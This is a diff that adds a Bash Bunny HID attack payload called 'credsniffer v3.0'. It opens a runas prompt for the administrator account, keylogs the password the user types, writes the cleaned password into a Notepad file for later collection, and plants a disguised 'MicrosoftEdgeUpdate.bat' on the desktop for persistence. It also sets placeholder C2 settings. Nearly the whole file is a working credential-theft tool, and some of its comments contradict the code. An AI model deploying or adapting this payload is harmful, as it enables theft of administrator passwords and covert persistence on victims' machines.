@@ -1,0 +1,162 @@
+###############################KeyLogin#####################################
+#   Version 3.0
+#   OS: Windows 10/11
+#   Author: 0i41E (modified)
+#   Description: Captures admin credentials via runas console prompt,
+#   drops raw keylog to Windows %TEMP%\.sysinfo for Bash Bunny pickup,
+#   and plants a fake Microsoft Edge shortcut on H:\Desktop for persistence.
+#
+####################Config###################################################
+
+# Set these before deploying:
+C2_IP="10.8.56.157"          # Your C2 IP or hostname (reserved for future use)
+C2_PORT="8443"                 # C2 HTTP port (reserved for future use)
+RUNAS_USER="Administrator"     # Local or domain admin to runas as (e.g. DOMAIN\\Administrator)
+
+# Keyboard language of TARGET machine (not attacker machine)
+# se=Swedish, de=German, us=English, fr=French, etc.
+export DUCKY_LANG=se
+
+####################Logging##################################################
+# One-shot lock — must be first, before any log file is created.
+# Prevents duplicate log files and re-triggering on subsequent ENTER presses.
+[ -f /tmp/creds_lock ] && exit 0
+touch /tmp/creds_lock
+
+LOG_FILE="/root/loot/credsniffer_$(date +%Y%m%d_%H%M%S).log"
+mkdir -p /root/loot
+
+log() {
+    local level="$1"; shift
+    echo "[$(date +%H:%M:%S)] [$level] $*" | tee -a "$LOG_FILE"
+}
+
+log INFO "=== credsniffer v3.0 payload started ==="
+log INFO "RUNAS_USER=$RUNAS_USER | DUCKY_LANG=$DUCKY_LANG"
+
+####################Trigger & Clean Up#######################################
+# IMPORTANT: Works best on a logged-in Windows session.
+# The runas console prompt will not appear on a lock screen.
+# Uncomment one trigger strategy:
+
+# Strategy 1: Simple — fires on any ENTER (risky, can trigger mid-session)
+MATCH \[ENTER\]
+
+# Strategy 2: Safer — only fires during first 30 seconds after boot (uncomment to use)
+# This gives you time to unplug if you realize it's plugged into the wrong machine
+# MATCH \[ENTER\]
+# if [ $(date +%s) -gt $(($(stat -f%B /root 2>/dev/null || echo 0) + 30)) ]; then exit; fi
+
+log INFO "STEP 1: Trigger fired — one-shot lock acquired, cleaning old loot"
+rm -f /root/loot/win-pass*
+
+########################Capture Admin Credentials via runas##################
+# runas /user:Administrator opens a console password prompt regardless of UAC
+# policy or Group Policy — it always prompts, even on domain/org machines.
+# SAVEKEYS captures the password typed into that console window.
+#
+# Set RUNAS_USER above. On domain PCs use DOMAIN\\Administrator.
+# Find domain with: whoami (output is DOMAIN\username)
+
+log INFO "STEP 2: HID — Win+R → runas /user:$RUNAS_USER cmd"
+Q DELAY 1000
+
+# Open Run dialog and launch runas — spawns a console asking for the password
+Q GUI r
+Q DELAY 600
+Q STRING runas /user:$RUNAS_USER cmd
+Q ENTER
+Q DELAY 1200
+
+# Start capturing BEFORE the user types — console is now waiting for password
+# NEXT 50 is enough: password (up to ~40 chars) + ENTER
+# Capture happens now as user types into the runas console password field
+log INFO "STEP 3: Starting SAVEKEYS capture (50 keys, background)"
+SAVEKEYS /root/loot/win-pass.txt NEXT 10 &
+echo $! > /tmp/savekeys.pid
+log INFO "STEP 3: SAVEKEYS started (pid=$(cat /tmp/savekeys.pid)) — waiting for user to type password into runas console"
+
+# Poll for capture completion — UAC credential entry happens here
+log INFO "STEP 4: Polling for SAVEKEYS output (30s max, 0.5s interval)..."
+for i in {1..60}; do
+    [ -f /root/loot/win-pass.txt ] && { log INFO "Capture file appeared after $((i/2))s"; break; }
+    sleep 0.5
+done
+
+# If still no file, kill SAVEKEYS to force it to flush whatever it captured
+if [ ! -f /root/loot/win-pass.txt ]; then
+    log INFO "STEP 4: Poll timed out — killing SAVEKEYS (pid=$(cat /tmp/savekeys.pid 2>/dev/null)) to force flush"
+    kill "$(cat /tmp/savekeys.pid 2>/dev/null)" 2>/dev/null
+    sleep 1
+fi
+
+# Bail out gracefully if nothing was captured (user dismissed UAC, or was already admin)
+if [ ! -f /root/loot/win-pass.txt ]; then
+    log ERROR "STEP 4 FAILED: Timed out — user dismissed runas console, or RUNAS_USER='$RUNAS_USER' not found on this machine."
+    exit 1
+fi
+log INFO "STEP 4 OK: Capture complete — $(wc -c < /root/loot/win-pass.txt) bytes, $(wc -l < /root/loot/win-pass.txt) lines"
+
+#####################Drop Keylog to Windows Temp############################
+# Write the raw captured keylog to a predictable Windows temp path.
+# Bash Bunny (plugged in later in STORAGE mode) can read and exfil this file.
+# Uses plain cmd echo — no PowerShell, no execution policy needed.
+
+log INFO "STEP 5: Dropping keylog to H:\\Downloads\\password.txt for Bash Bunny pickup"
+# Strip multi-char tokens like [ENTER],[SHIFT],[BACKSPACE] — leave only typed chars
+# [A-Z_]{2,} matches multi-char token names; single-char tokens like [a] become just 'a'
+CLEAN_KEYS=$(sed 's/\[[A-Z_0-9]\{2,\}\]//g' /root/loot/win-pass.txt | tr -d '[]' | tr -d '\n\r')
+log INFO "STEP 5: Cleaned password to inject: ${CLEAN_KEYS}"
+
+Q DELAY 2000
+Q GUI r
+Q DELAY 600
+Q STRING notepad H:password.txt
+Q ENTER
+Q DELAY 1200
+# If file doesn't exist, Notepad asks "Create new file?" — confirm with Enter
+Q ENTER
+Q DELAY 800
+# Type the cleaned password into the blank Notepad window
+Q STRING ${CLEAN_KEYS}
+Q DELAY 300
+# Ctrl+S to save
+Q CTRL-SHIFT s
+Q DELAY 500
+Q ALT F4
+log INFO "STEP 5 OK: password.txt saved to H:\\Downloads via Notepad"
+
+#####################Persistence Batch File on H:\Desktop##################
+# Drops a .bat file directly onto H:\Desktop using plain cmd echo — no quotes,
+# no VBScript, no PowerShell, no special characters that break on Swedish keyboard.
+# Replace the payload echo line with a real curl/SSH command when ready.
+
+log INFO "STEP 6: Dropping MicrosoftEdgeUpdate.bat onto H:\\Desktop"
+Q DELAY 1500
+Q GUI r
+Q DELAY 600
+Q STRING cmd
+Q ENTER
+Q DELAY 400
+Q STRING cd H:
+Q ENTER
+Q DELAY 200
+Q STRING cd Desktop
+Q ENTER
+Q DELAY 200
+Q STRING powershell
+Q DELAY 600
+Q ENTER
+Q DELAY 600
+Q STRING Set-Content -Path 'MicrosoftEdgeUpdate.bat' -Value ThisCouldBeSSHorPOST
+Q ENTER
+Q DELAY 200
+Q STRING exit
+Q ENTER
+log INFO "STEP 6 OK: MicrosoftEdgeUpdate.bat planted on H:\\Desktop"
+
+Q DELAY 1000
+log INFO "=== credsniffer v3.0 finished — loot at /root/loot/ | log: $LOG_FILE ==="
+
+#You may want to delete or disable the payload after execution to avoid re-triggering
+#rm /root/udisk/payloads/credsniffer.txt
